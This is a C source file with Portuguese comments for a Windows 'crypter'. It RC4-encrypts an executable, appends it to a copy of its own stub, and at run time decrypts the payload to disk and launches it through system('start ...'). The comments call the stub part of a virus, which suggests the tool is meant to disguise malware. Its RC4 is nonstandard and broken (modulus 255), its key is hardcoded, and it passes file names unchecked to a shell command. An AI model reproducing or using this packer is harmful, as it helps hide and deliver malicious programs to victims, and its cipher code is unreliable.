#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio2.h>
#include <windows.h>
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#define NUMNOMEEXECRYPT 200 //caracterwes disponíveis para o nome do exe à encryptar
#define NUMARQSAIDA 200 //caracteres disponiveis para armazenar o nome que o arquivo tera ao ser extraído
#define NUMNOMEEXESAIDA 200 //numero de caracteres do nome como sera salvo o arquivo encriptado...
#define DIVISORIA tgmkmunp //palavra ou marca que divide o arquivo... divide o stub do virus...
#define TEMPCHAR 206 //numero de caracteres disponiveis para a tempchar(são seis a mais que o nome, pois é usado para escrever "start %s", nomedoarquivo)
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#define CORPADRAO 15 //cor padrão do menu
#define CORCEL 240 //cor do menu celecionado
#define CORSIM 180
#define CORNAO 196
#define COROK 160
#define CORNOK 196
#define CORALERTA 14
void confignome(char *origem, int tamorig, char *destino, int tamdestino){//função para remover partes de "caminho" do nome de um arquivo
     //recebe a string com o nome de origem (ainda com o caminho), o tamanho dela, a string de destino (onde sera escrido o nome sem o caminho), tamanho do destino.
     int x=0, y=0;
     while(x<tamorig){
        if(origem[x]==92){
            y=0;
            while(y<tamdestino){//zera toda a string de saida
               destino[y]=0;
               y++;
            }
            y=0;
        }
        else{//escreve um caracter na saida
            destino[y]=origem[x];
            y++;
            if(y>=tamdestino) break;
        }
        x++;
     }
}
void injetar(FILE* origem, FILE* destino){
    while (!feof(origem)){//enquanto o arquivo não acaba o arquivo origem...
        putc(getc(origem), destino); //copia o arquivo origem para o destino
    }
}
int get_size(FILE* file){ //função para obter o tamanho de um arquivo /retorna o tamanho do arquivo / função copiada...
    int size;
    fseek(file, 0, SEEK_END);
    size = ftell(file);
    rewind(file);
    return size;
}
char* alloc_char_buffer(unsigned int size){ //aloca memoria para armazenar o exe a ser encryptado na RAM
    char* buff = NULL;
    buff = (char*)calloc(size, sizeof(char));
    if (!buff){
        printf("Falha ao alocar memoria RAM");
        getch();
        exit(0);
    }
    return buff; //retorna o ponteiro para o booffer que tem a memoria
}
//@@@@@@@@@@@@@@@@@@@@@@@ Ainda quero CRIAR uma RC4 MINHA... esta é COPIADA do carinha
void SWITCH(int *a, int *b){ //usado no rc4...
    *(a) = *(a) ^ *(b); //obtemos um número aleatório
    *(b) = *(a) ^ *(b); //obtemos a
    *(a) = *(a) ^ *(b); //obtemos b
}
char* rc4(const int* key, int key_size, char* buff, int buff_size){
    int i, j, k;
    int s[255], rk[255]; //rk = random_key
    char* encrypted = alloc_char_buffer(buff_size);
    for (i = 0; i < 255; i++){
        s[i] = i;
        rk[i] = key[i%key_size];
    }
    j = 0;
    for (i = 0; i < 255; i++){
        j = (j + s[j] + rk[i]) % 255;
        SWITCH(s + i, s + j);
    }
    i = 0;
    j = 0;
    for (k = 0; k < buff_size; k++){
        i = (i + 1) % 255;
        j = (j + s[i]) % 255;
        SWITCH(s + i, s + j);
        encrypted[k] = (char)(s[(s[i] + s[j]) % 255] ^ (int)buff[k]);
    }
    return encrypted;
}
void file_write(FILE* file, const char* buff, int size){
    int it;
    for (it = 0; it < size; it++)
    fputc(buff[it], file);
}
int cliente_mai_n(void){
    const char diviso[11]={48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58};
    FILE* fluxo_stub;
    char dirnome[MAX_PATH];//MAX_PATH é definida em minwindef.h(windows.h ACHO)
    GetModuleFileName(NULL, dirnome, MAX_PATH);//pega o nome do proprio programa que esta executando...
    if((fluxo_stub=fopen(dirnome, "rb"))==NULL){//o programa não consegue se ler para compiar futuramente o seu proprio conteúdo
            printf("Não e possivel ler o conteudo cenessario...");
            getch();
            exit(0);
        }
    fluxo_stub=fopen(dirnome, "rb");
    char nome_exe_encrypt[NUMNOMEEXECRYPT]={0}, *p_nome_exe_encrypt;//string e ponteiro que armazenam o caminho\nome do arquivo a ser encryptado
    char nome_exe_saida[NUMNOMEEXESAIDA]={0};
    char nome_exe_descrypt[NUMARQSAIDA]={0}, *p_nome_exe_descrypt; //string e ponteiro para o nome do arquivo de saida
    //chave usada para cryptografar o exe #################################################################################################
    const int KEY_PADRAO[8] = {
        0x1, 0x10, 0x12, 0x15,
        0x234, 0x33, 0x44, 0x88
    };
    //quantos bytes possui a chave ########################################################################################################
    const int KEY_SIZE = 8;
    int KEY[8]={0};
    int atua=1, opcao=1, senhvalid=0, x=0, posi=0;
    int conf[4]={0,1,1,1};
    //conf[3]:
              // [0] - armazena a configuração de senha: 1 se for senha que o usuario digitar, e 0 se for a chave padrão
              // [1] - Armazena a configuração, se executa automaticamente apos descriptografar seta em 1, se não, em 0
              // [2] - Armazena a função, se deseja cryptografar algum arquivo, seta em 1, se deseja programar captura de arquivo, seta em 2.
              // [3] - Armazena o modo, seta em 1 se for modo rapido, em 2 se for modo normal, e em 0 se for modo de captura de arquivo. seta em 3 para indicar que o programa pode iniciar a criptografia (quando em modo rapido)
    int chavcry[8]={0};
    unsigned char dig;
    FILE* fluxo_exe_encrypt;
    int size_exe=0;
    char* encrypted;
    char* buff_exe=NULL;
    while(1){
        if(atua==1){
            atua=0;
            clrscr();
            if (opcao==1) printf("\n\n     Voce agora pode arrastar os arquivos para ca! Experimente...");
            else printf("\n\n");
            printf("\n\n    OBS: O arquivo celecionado nao pode conter caracteres especiais no nome...");
            if(opcao==0) textcolor(CORCEL);
            else textcolor(CORPADRAO);
            printf("\n\n    Funcao- ");
            if(conf[2]==1) textcolor(CORSIM);
            else textcolor(CORPADRAO);
            printf(" Criptografia ");
            if(conf[2]==2) textcolor(CORSIM);
            else textcolor(CORPADRAO);
            printf(" Programar captura de arquivo ");
            if(opcao==1) textcolor(CORCEL);
            else textcolor(CORPADRAO);
            printf("\n\n\n\n\n\n    Nome do arquivo a encapsular (COM EXTENSAO)- ");
            if((fluxo_exe_encrypt=fopen(nome_exe_encrypt, "rb"))==NULL) textcolor(CORNOK);//verifica se o arquivo existe
            else{
                 textcolor(COROK);
                 if(conf[3]==1)conf[3]=3;//se ele estiver no meodo rapido (1) inicia a criptografia, ja que o aquivo ja foi encontrado...
            }
            printf("%s", nome_exe_encrypt);
            if(opcao==2) textcolor(CORCEL);
            else textcolor(CORPADRAO);
            printf("\n    Nome do arquivo de saida (SEM EXTENSAO)----- ");
            textcolor(CORPADRAO);
            printf("%s", nome_exe_saida);
            if(opcao==3) textcolor(CORCEL);
            else textcolor(CORPADRAO);
            printf("\n    Chave da criptografia (OITO DIGITOS)-------- ");
            if(conf[0]==0) textcolor(CORSIM);
            else textcolor(CORPADRAO);
            printf(" CHAVE PADRAO ");
            if(conf[0]==1) textcolor(CORSIM);
            else textcolor(CORPADRAO);
            printf("%c%c%c%c%c%c%c%c", chavcry[0], chavcry[1], chavcry[2], chavcry[3], chavcry[4], chavcry[5], chavcry[6], chavcry[7]);
            if((conf[0]==1)&(senhvalid==1)){
                textcolor(COROK);
                printf(" OK ");
            }
            if(opcao==4) textcolor(CORCEL);
            else textcolor(CORPADRAO);
            printf("\n    Executar apos descriptografar--------------- ");
            if(conf[1]==1) textcolor(CORSIM);
            else textcolor(CORPADRAO);
            printf("  SIM  ");
            if(conf[1]==0) textcolor(CORSIM);
            else textcolor(CORPADRAO);
            printf("  NAO  ");
            if(opcao==5) textcolor(CORCEL);
            else textcolor(CORPADRAO);
            printf("\n    Modo do crypter- ");
            if(conf[3]==1) textcolor(CORSIM);
            else textcolor(CORPADRAO);
            printf(" RAPIDO ");
            if(conf[3]==2) textcolor(CORSIM);
            else textcolor(CORPADRAO);
            printf(" NORMAL ");
            textcolor(CORPADRAO);
            if(conf[3]==1) printf("\n\n     Neste modo, deve-se configurar tudo ANTES de informar o nome do arquivo...");
            if(conf[2]==2) {textcolor(CORALERTA); printf("\n\n     Nesta funcao, o programa ira CAPTURAR o arquivo programado quando executado!"); textcolor(CORPADRAO);}
        }
        if(conf[3]==3) dig=13;//caso o arquivo tenha sido encontrado, o programa inicia a criptografia imediatamente
        else dig=getch();
        switch(dig){
            case 13:
                if((fluxo_exe_encrypt=fopen(nome_exe_encrypt, "rb"))==NULL) {//o arquivo escrito não é valido
                    if(conf[2]==1){//se esta no modo criptografia
                        opcao=1;
                        atua=1;
                        break;
                    }//caso esteja no modo de captura, ele configura a saida para capturar o arquivo dito, mesmo que ele não exista
                }
                if(conf[0]==1){//pessoa vai usar chave propria
                    if(senhvalid==0) {
                        opcao=3;
                        atua=1;
                        break;
                    }
                    x=0;
                    while(x<8){
                        KEY[x]=chavcry[x];
                        x++;
                    }
                }
                if(conf[0]==0){//pessoa vai usar chave padrão
                    x=0;
                    while(x<8){
                        KEY[x]=KEY_PADRAO[x];
                        x++;
                    }
                }
                clrscr();
                printf("Processando...");
                if(nome_exe_saida[0]==0){
                    int a=0;//variaveis para controle do tamanho do coisa.
                    while(a<NUMNOMEEXECRYPT){
                       nome_exe_saida[a]=nome_exe_encrypt[a];
                       a++;
                    }
                }
                strcat(nome_exe_saida, ".exe");
                FILE* fluxo_exe_saida;
                fluxo_exe_saida=fopen(nome_exe_saida, "wb");
                fluxo_exe_encrypt=fopen(nome_exe_encrypt, "rb");
                injetar(fluxo_stub, fluxo_exe_saida);//copia a stub para o arquivo...
                //escreve algum conteudo no arquivo de saida, um conteudo que fará a DIVISORIA entre a stub e o  vírus...
                fwrite(diviso, strlen(diviso), 1, fluxo_exe_saida);
                p_nome_exe_descrypt=&nome_exe_descrypt[0];
                p_nome_exe_encrypt=&nome_exe_encrypt[0];
                confignome(p_nome_exe_encrypt, NUMNOMEEXECRYPT, p_nome_exe_descrypt, NUMARQSAIDA);//reescreve o nome do arquivo a ser encriptado, removendo o caminho associado a ele
                fwrite(nome_exe_descrypt, NUMARQSAIDA, 1, fluxo_exe_saida);//escreve o nome do arquivo a ser extraido
                fwrite(&conf[0], sizeof(char), 3, fluxo_exe_saida);//escreve qs configurações
                /*if(conf[3]==3){//se estava em modo rápido (ESTE TRECHO SERVE PARA ELE REABRIR UMA NOVA INSTÂNCIA DO PROGRAMA QUANDO TERMINOU DE CRIPTOGRAFAR UMA)
    				GetModuleFileName(NULL, dirnome, MAX_PATH);//obtém o nome de sí mesmo
    				char starte[MAX_PATH];//usei MAX_PATH pq é o tamanho máximo de um nome no sistema (definido pelo sistema)...
    				int x=3, y=4;//cria as auxiliares uma sai a frente pq ja tem a primeir aaspa feita
    				starte[0]=dirnome[0];
    				starte[1]=dirnome[1];
    				starte[2]=dirnome[2];
    				starte[3]=34;//coloca uma aspa
                    while((x<MAX_PATH)&&(y<MAX_PATH)){
                         if(dirnome[x]==92){//se for igual a barra ( \ )
                              starte[y]=34;
                              y++;
                              starte[y]=92;
                              y++;
                              starte[y]=34;
                         }
                         else starte[y]=dirnome[x];
                         x++;
                         y++;
                    }
                    
                    sprintf(dirnome, "start %s", starte);
    				system(dirnome);//manda iniciar nova instância de sí mesmo
    				clrscr();
                	printf("Arquivo encyptado com sucesso!");
                	//Sleep(200);
				}*/
                size_exe=get_size(fluxo_exe_encrypt);//pega o tamanho do arquivo a ser encryptado
                buff_exe=alloc_char_buffer(size_exe);//aloca memoria suficiente para salvar o arquivo
                fread(buff_exe, size_exe, 1, fluxo_exe_encrypt);//le o conteúdo do exe a ser encryptado e o coloca na RAM, no espaço alocado anteriormente
                encrypted = rc4(KEY, KEY_SIZE, buff_exe, size_exe);//envia a chave da criptografia, o tamanho da chave, o ponteiro que indica o local da RAM onde esta armaenado o exe a ser encryptado, e envia o tamanho do mesmo
                fwrite(encrypted, size_exe, 1,fluxo_exe_saida);//copia o conteudo criptografado para o arquivo de saida...
                //fecha todos os fluxos
                fclose(fluxo_exe_encrypt);
                fclose(fluxo_stub);
                fclose(fluxo_exe_saida);
                free(buff_exe);
                free(encrypted);
                return(1);
                break;
            case 8://pessoa apaga caracter
                switch(opcao){
                    case 1:
                        if(posi>0) posi--;
                        nome_exe_encrypt[posi]=0;
                        atua=1;
                        break;
                    case 2:
                        if(posi>0) posi--;
                        nome_exe_saida[posi]=0;
                        atua=1;
                        break;
                    case 3:
                        if(posi>0) posi--;
                        chavcry[posi]=0;
                        senhvalid=0;
                        atua=1;
                        break;
                    default:
                        break;
                }
                break;
            case 9://pessoa pressionou Tab
                if(opcao<4){
                    opcao++;
                    atua=1;
                }
                break;
            case 27:
                exit(0);
                break;
            case 224:
                posi=0;
                dig=getch();
                switch(dig){
                    case 72://para cima
                        if(opcao>0){
                            opcao--;
                            atua=1;
                        }
                        break;
                    case 80://para baixo
                        if(opcao<5){
                            opcao++;
                            atua=1;
                        }
                        break;
                    case 77://para direita
                        switch(opcao){
                            case 0:
                                conf[2]=2;
                                atua=1;
                                break;
                            case 3:
                                conf[0]=1;
                                atua=1;
                                break;
                            case 4:
                                conf[1]=0;
                                atua=1;
                                break;
                            case 5:
                                 if(conf[3]<2) conf[3]++;
                                 atua=1;
                                 break;
                            default:
                                break;
                        }
                        break;
                    case 75://para esquerda
                        switch(opcao){
                            case 0:
                                conf[2]=1;
                                atua=1;
                                break;
                            case 3:
                                conf[0]=0;
                                atua=1;
                                break;
                            case 4:
                                conf[1]=1;
                                atua=1;
                                break;
                            case 5:
                                 if(conf[3]>1) conf[3]--;
                                 atua=1;
                                 break;
                            default:
                                break;
                        }
                        break;
                    
                }
                break;
            default:
                switch(opcao){
                    case 1:
                        if(posi<NUMNOMEEXECRYPT){
                        	switch(dig){//Aqui é a função que FILTRA os caracteres que poderão fazer parte do nome do arquivo de origem
                        		case 34://filtra as aspas ("). não poderão estar no nome para que o arrasta e solta funcione...
                        			break;
                        		default:
                        			nome_exe_encrypt[posi]=dig;
                            		posi++;
                            		break;
                        	}
                        }
                        atua=1;
                        break;
                    case 2:
                        if(posi<NUMNOMEEXESAIDA){
                            nome_exe_saida[posi]=dig;
                            posi++;
                        }
                        atua=1;
                        break;
                    case 3:
                        if(conf[0]==1){
                            if(posi<8){
                                chavcry[posi]=dig;
                                posi++;
                            }
                            if(posi==8) senhvalid=1;
                            else senhvalid=0;
                            atua=1;
                        }
                        break;
                    default:
                        break;
                }
                break;
        }
    }
}
void stub_mai_n(char *buff_arq, int x, int size_arq){
    const int KEY_PADRAO[8] = {0x1, 0x10, 0x12, 0x15, 0x234, 0x33, 0x44, 0x88};//chave da criptografia
    const int KEY_SIZE = 8;//quantos bytes possui a chave
    unsigned char dig=0;
    char exec=1, chave=0, func=1;
    x++;
    int y=0;
    char nome_extrair[NUMARQSAIDA]={0};
    while(y<NUMARQSAIDA){
        nome_extrair[y]=buff_arq[x];
        x++;
        y++;
    }
    chave=buff_arq[x];//le configuração de chave
    x++;
    exec=buff_arq[x];//le configuração de execução
    int size_util=0;
    x++;
    func=buff_arq[x];//le configuração de chave
    x++;
    size_util=size_arq-x;
    if(x>=size_arq) exit(0);
    
    char* buff_util=NULL;
    buff_util=alloc_char_buffer(size_util);
    y=0;
    while(x<size_arq){//copia o arquivo criptografado para outra string
        buff_util[y]=buff_arq[x];
        x++;
        y++;
    }
    char* decripted;
    decripted=alloc_char_buffer(size_util);//Aloca espaço para o resultado...
    int KEY[8]={0};
    if(chave==1){
        x=0;
        dig=0;
        while(x<10){
            clrscr();
            printf("Digite a chave da cryptografia - %c%c%c%c%c%c%c%c", KEY[0], KEY[1], KEY[2], KEY[3], KEY[4], KEY[5], KEY[6], KEY[7]);
            dig=getch();
            switch(dig){
                case 27:
                    exit(0);
                    break;
                case 8://pressionou o deletar...
                    if(x>0) x--;
                    KEY[x]=dig;
                    break;
                case 13:
                    x=20; //seta ele como 20, somente para sair do while
                    break;
                default:
                    KEY[x]=dig;
                    if(x<7) x++;
                    break;
            }
        }
    }
    else{
        x=0;
        while(x<8){
            KEY[x]=KEY_PADRAO[x];
            x++;
        }
    }
    clrscr();
    printf("Processando...");
    FILE* fluxo_strak;
    fluxo_strak=fopen(nome_extrair, "wb");
    decripted=rc4(KEY, KEY_SIZE, buff_util, size_util);//descriptografa o conteúdo
    fwrite(decripted, size_util, 1, fluxo_strak);
    fclose(fluxo_strak);
    if(exec==1){
        char tempchar[TEMPCHAR]={0};
        sprintf(tempchar, "start %s", nome_extrair);
        system(tempchar);
    }
    exit(0);
}
int main(void){
    int ok=0; //é setada em 1 quando a divisória/marcação é encontrada...
    int extraircripter=0; //seta em 1 quando o usuario seguranenter ao abrir, ou seja, para que o programa extraia o cripter, e nao o arquivo
    const char diviso[11]={48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58};
    char dirnome[MAX_PATH];//MAX_PATH é definida em minwindef.h(windows.h ACHO)
    GetModuleFileName(NULL, dirnome, MAX_PATH);
    FILE* fluxo_arq;
    fluxo_arq=fopen(dirnome, "rb");
    int size_arq;
    char* buff_arq;
    size_arq = get_size(fluxo_arq);//obtem o tamanho de  si mesmo
    buff_arq= alloc_char_buffer(size_arq);//aloca esta quantidade de memoria
    fread(buff_arq, size_arq, 1, fluxo_arq);//carrega todo o conteúdo do arquivo para a variavel (PONTEIRO) "buff_arq"
    int x=0, y=0;
    // IMPORTANTE: o programa testa ANTES de encontrar a divisória, justamente para que o "x" não seja zerado depois...
    printf("Pressione qualquer tecla para extrair o Crypter.exe");
    while(10>x){//inicio da perte que testa se o usuario segura o enter
        Sleep(1);
        if(kbhit()) extraircripter=1;
        x++;
    }//fim da perte que testa se o usuario segura o enter
    clrscr();
    while(x<size_arq){
        if(buff_arq[x]==diviso[0]){
            if(buff_arq[x+1]==diviso[1]){
                if(buff_arq[x+2]==diviso[2]){
                    if(buff_arq[x+3]==diviso[3]){
                        if(buff_arq[x+4]==diviso[4]){
                            if(buff_arq[x+5]==diviso[5]){
                                if(buff_arq[x+6]==diviso[6]){
                                    if(buff_arq[x+7]==diviso[7]){
                                        if(buff_arq[x+8]==diviso[8]){
                                            if(buff_arq[x+9]==diviso[9]){
                                                if(buff_arq[x+10]==diviso[10]){
                                                    x=x+10;
                                                    ok=1;
                                                    break;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        x++;
    }
    if(ok==0){//caso o arquivo não tenha a divis´pria, significa que o programa esta sendo executado como um cliente
         while(1){//fica repetindo enquanto estiver retornando 1
              if(cliente_mai_n()!=1) exit(0);
         }
    }     
    //aqui ele ja encontrou a divisória
    if(extraircripter==1){//extrair o crypter
        FILE* fluxo_crypter;
        if((fluxo_crypter=fopen("Crypter.exe", "wb"))==NULL){
            printf("\n\n\nFalha ao extrair o crypter...");
            exit(0);
        }
        else{
            fluxo_crypter=fopen("Crypter.exe", "wb");
            x=x-10;//menos 10, por que a divisoria tem 10 digitos
            fwrite(buff_arq, x, 1, fluxo_crypter);//usa o proprio "x" como referência de tamanho, pois a variavel contou o tamanho da parte que é antes da divisória...
            exit(0);
        }
    }
    fclose(fluxo_arq);
    stub_mai_n(buff_arq, x, size_arq);
}
